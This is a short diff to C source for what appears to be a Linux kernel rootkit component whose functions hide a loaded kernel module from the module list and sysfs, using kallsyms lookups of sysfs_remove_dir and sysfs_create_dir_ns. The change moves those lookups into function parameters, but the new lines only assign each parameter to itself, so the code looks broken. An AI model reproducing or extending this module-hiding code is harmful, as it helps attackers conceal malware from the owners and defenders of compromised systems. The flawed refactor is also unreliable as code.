@@ -3,8 +3,7 @@ int dev_open_fops_for_hide(struct inode *inode, struct file* file)
 {
     static struct list_head *module_list;
     struct kobject* saved_kobj_parent;
-    sysfs_remove_fir_orig = (void *)kallsyms_lookup_name("sysfs_remove_dir");
-    sysfs_create_fir_orig = (void *) kallsyms_lookup_name("sysfs_create_dir_ns");
+    
     if (!is_hide)
     {
         /*wait to get mutex*/
@@ -64,8 +63,10 @@ static int hide_driver_entery(void)
     sema_init(&virtual_device1.sem, 1);
     return 0;
 }
-static int start_hide(void)
+static int hide_module(unsigned long * sysfs_remove_fir_orig, unsigned long * sysfs_create_fir_orig)
 {
+    sysfs_remove_fir_orig = (void *) sysfs_remove_fir_orig;
+    sysfs_create_fir_orig = (void *) sysfs_create_fir_orig;
     ret = hide_driver_entery();
     if (ret == -1)
     {
